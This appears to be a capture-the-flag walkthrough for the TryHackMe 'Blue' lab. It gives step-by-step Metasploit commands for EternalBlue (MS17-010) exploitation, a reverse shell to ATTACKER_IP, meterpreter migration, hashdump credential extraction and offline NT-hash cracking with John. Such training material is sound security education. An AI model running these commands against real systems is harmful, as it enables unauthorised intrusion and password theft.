---
link: https://tryhackme.com/room/blue
difficulty: Easy
description: Command-only reference — Windows host, SMBv1 / MS17-010 to SYSTEM, hash dump and offline crack.
---

<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/writeup_try_hack_me_logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">Blue Writeup</p></div>

  <img src="https://cdn-images.tryhackme.com/room-icons/blue-1785241443587.png" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 22px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: nedmoeca</p>
    <p style="margin: 0;">Author(s): ben, DarkStar7471</p>
    <p style="margin: 0;">Difficulty: Easy</p>
    <p style="margin: 0;">Date: 30 Aug 2026</p>
  </div>

</div>
<!-- PAGE BREAK -->

## Summary

Category: **Exploitation**, with a secondary phase of **Post-Exploitation / Credential Attacks**. Exploitation comes first and dominates the box: a Windows 7-era host exposes SMBv1 on 445, and the vulnerability is a memory-corruption bug in the SMBv1 transaction handling that yields remote code execution as SYSTEM without any credentials. The second half is genuinely a different skill. You take a raw shell, upgrade it to a full post-exploitation session, dump the local password database, and crack a hash offline. There's no lateral movement here; the initial exploit already lands you at the highest privilege level on a standalone host, so "escalation" in this room is really session upgrading rather than true privilege escalation.

## Prerequisites

`nmap`, `metasploit-framework` (msfconsole), `john` (or `hashcat` + an OpenCL/CUDA backend), `rockyou.txt` wordlist, `ifconfig` (net-tools) or `iproute2`, an active lab VPN connection.

## Placeholder legend

| Token | Where to get it |
| --- | --- |
| `TARGET_IP` | The lab machine's IP shown on the room page after **Start Lab Machine**. Changes every spawn. |
| `ATTACKER_IP` | Your VPN address — the `inet` value from `ifconfig tun0`. Changes on every VPN reconnect. |
| `<SESSION_ID>` | ⚠ Session number of the raw shell, from `sessions`. Per-spawn. |
| `<METERPRETER_SESSION_ID>` | ⚠ Session number of the upgraded session, from `sessions`. Per-spawn. |
| `<SYSTEM_PID>` | ⚠ PID of a SYSTEM-owned, x64, long-lived native service from `ps`. Per-spawn. |
| `<JON_NT_HASH>` | ⚠ Field 4 of Jon's line in `hashdump` output. Per-spawn. |

Box-design values left as-is: local username `Jon`, flag file paths, port numbers.
The host does not respond to ICMP — always use `-Pn`.

<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 1 Recon

### Q1 Scan the machine. (If you are unsure how to tackle this, I recommend checking out the [Nmap](https://tryhackme.com/room/furthernmap) room)

==No answer needed==

```
nmap -p- --min-rate 5000 -Pn TARGET_IP
```

Version-scan only the distinct services. The 49152+ block is the dynamic RPC range already represented by port 135 — scanning it adds minutes and tells you nothing.

```
nmap -A -Pn -p 135,139,445,3389,5985,47001 TARGET_IP
```

### Q2 How many ports are open with a port number under 1000?

==3==

135, 139, 445

### Q3 What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

==ms17-010==

```
nmap -Pn -p 445 --script vuln TARGET_IP
```

`smb-vuln-ms10-061` returning `ERROR` is inconclusive, not clean — report it as untested.

<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 2 Gain Access

### Q4 Start [Metasploit](https://tryhackme.com/module/metasploit)

==No answer needed==

```
msfconsole
```

Wait for the `msf >` prompt — the module index takes 10–30 s to load.

### Q5 Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

==exploit/windows/smb/ms17_010_eternalblue==

```
search ms17-010
```

### Q6 Show options and set the one required value. What is the name of this value? (All caps for submission)

==RHOSTS==

```
use exploit/windows/smb/ms17_010_eternalblue
show options
```

Use the full path rather than `use 0` — index numbers shift between module database versions.

The auto-populated `LHOST` is a local virtualisation adapter address, not your VPN address. Left unchanged, the exploit reports success and no session ever appears.

### Q7 Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:<br>`set payload windows/x64/shell/reverse_tcp`<br>With that done, run the exploit!

==No answer needed==

Get your VPN address first:

```
ifconfig tun0
```

Take the `inet` value — that is `ATTACKER_IP`. Re-run after any VPN reconnect; the address is reassigned each time.

```
set payload windows/x64/shell/reverse_tcp
set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
show options
```

Verify against `show options`, not the `=>` confirmation lines — the confirmation echoes what you typed, not what was set.

```
exploit
```

`run` is an accepted alias. You may have to press **Enter** for the DOS shell prompt to appear. If no session opens, re-run; EternalBlue corrupts kernel memory and occasionally needs a retry or a target reboot.

```
whoami
```

Runs on the target, not the attack box. The command echoes twice — normal for a raw `shell/reverse_tcp` payload.

### Q8 Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.

==No answer needed==

```
Ctrl+Z
```

Prompts `Background session ... ? [y/N]` — enter **y**. Returns to the `msf` prompt; the session stays alive.

<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 3 Escalate

### Q9 If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)

==post/multi/manage/shell_to_meterpreter==

```
use post/multi/manage/shell_to_meterpreter
```

### Q10 Select this (use MODULE_PATH). Show options, what option are we required to change?

==SESSION==

```
show options
```

`LHOST` is marked optional but its auto-detect is unreliable across VPN and virtualisation interfaces — set it manually anyway. Leave `LPORT 4433` and `HANDLER true` alone.

### Q11 Set the required option, you may need to list all of the sessions to find your target here.

==No answer needed==

```
sessions
set SESSION <SESSION_ID>          ⚠ swap — ID of the `shell x64/windows` row
set LHOST ATTACKER_IP             ⚠ swap — your tun0 address
```

### Q12 Run! If this doesn't work, try completing the exploit from the previous task once more.

==No answer needed==

```
run
```

`Post module execution completed` prints *before* the new session opens. Press **Enter** if the prompt does not refresh. Running `run` twice creates a duplicate session; kill spares with `sessions -k <id>`. If the underlying shell has died the conversion has nothing to push through — re-run the Task 2 exploit.

### Q13 Once the meterpreter shell conversion completes, select that session for use.

==No answer needed==

```
sessions
sessions -i <METERPRETER_SESSION_ID>    ⚠ swap — the `meterpreter x64/windows` row, not the shell
```

Prompt changes to `meterpreter >`.

### Q14 Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.

==No answer needed==

```
getsystem
getuid
shell
whoami
Ctrl+Z
```

`getsystem` returning `[-] Already running as SYSTEM` is success, not failure — the `[-]` marker here means elevation was unnecessary. `Ctrl+Z` prompts for confirmation — enter **y**; it returns you to `meterpreter >`, not to msfconsole.

### Q15 List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).

==No answer needed==

```
ps
```

Pick a target that is `NT AUTHORITY\SYSTEM`, `x64`, session 0, and a long-lived native service. `spoolsv.exe` and `wininit.exe` are the textbook picks; bare SYSTEM `svchost.exe` entries also work. Avoid `lsass.exe` (unstable, heavily alerted on), anything in session 1, the `cmd.exe`/`conhost.exe`/`powershell.exe` cluster you spawned, and the box's custom binary in `C:\`.

### Q16 Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.

==No answer needed==

```
migrate <SYSTEM_PID>              ⚠ swap — PID from your own ps output, never a value copied from a writeup
```

<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 4 Cracking

### Q17 Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?

==Jon==

```
hashdump
```

Line format is `username:RID:LMhash:NThash:::` — field 4 is the one to crack. `aad3b435b51404eeaad3b435b51404ee` in field 3 is the empty-LM placeholder, ignore it. RID 500 is the built-in Administrator, 501 is Guest; user-created accounts start at 1000+.

### Q18 Copy this password hash to a file and research how to crack it. What is the cracked password?

==REDACTED==

Run these on the attack box, in a separate terminal (or background meterpreter first):

```
echo '<JON_NT_HASH>' > jon.hash        ⚠ swap — Jon's NT hash from your own hashdump
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt jon.hash
```

`--format=nt` is required — without it John may misread a bare NT hash as LM and fail. If only `rockyou.txt.gz` is present, `gunzip` it first. Hashcat v7 fails here with `CL_PLATFORM_NOT_FOUND_KHR` on a VM with no OpenCL/CUDA/HIP backend, and `--force` does not fix it — use John.

Retrieve the result later with:

```
john --show --format=NT jon.hash
```

<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 5 Final Flags!

### Q19 Flag1? _This flag can be found at the system root._

==REDACTED==

From `meterpreter >`:

```
shell
```

```
dir C:\ /b
type C:\flag1.txt
```

### Q20 Flag2? _This flag can be found at the location where passwords are stored within Windows._

==REDACTED==

```
dir C:\Windows\System32\config /b
type C:\Windows\System32\config\flag2.txt
```

Windows occasionally deletes this flag. If it is missing, terminate/restart the machine and re-run the exploit.

### Q21 flag3? _This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved._

==REDACTED==

```
dir C:\Users\Jon\Documents /b
type C:\Users\Jon\Documents\flag3.txt
```

<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Fill-in table (per-spawn values)

| Token | Source command | Your value |
| --- | --- | --- |
| `TARGET_IP` | Room page / **Start Lab Machine** | |
| `ATTACKER_IP` | `ifconfig tun0` → `inet` | |
| `<SESSION_ID>` | `sessions` (the `shell x64/windows` row) | |
| `<METERPRETER_SESSION_ID>` | `sessions` (the `meterpreter x64/windows` row) | |
| `<SYSTEM_PID>` | `ps` (SYSTEM / x64 / session 0 service) | |
| `<JON_NT_HASH>` | `hashdump` → Jon's line, field 4 | |
| Jon's password | `john ... jon.hash` | |

## Terminal / host map

| Prompt | Runs on | Command set |
| --- | --- | --- |
| `┌──(user㉿kali)-[~]` | Attack box | `nmap`, `msfconsole`, `john`, `ifconfig` |
| `msf >` / `msf exploit(...) >` | Attack box (framework) | `use`, `set`, `show options`, `run`, `sessions` |
| `C:\...>` | Target | Windows built-ins: `whoami`, `dir`, `type` |
| `meterpreter >` | Target (in-memory agent) | `getuid`, `getsystem`, `ps`, `migrate`, `hashdump`, `shell` |
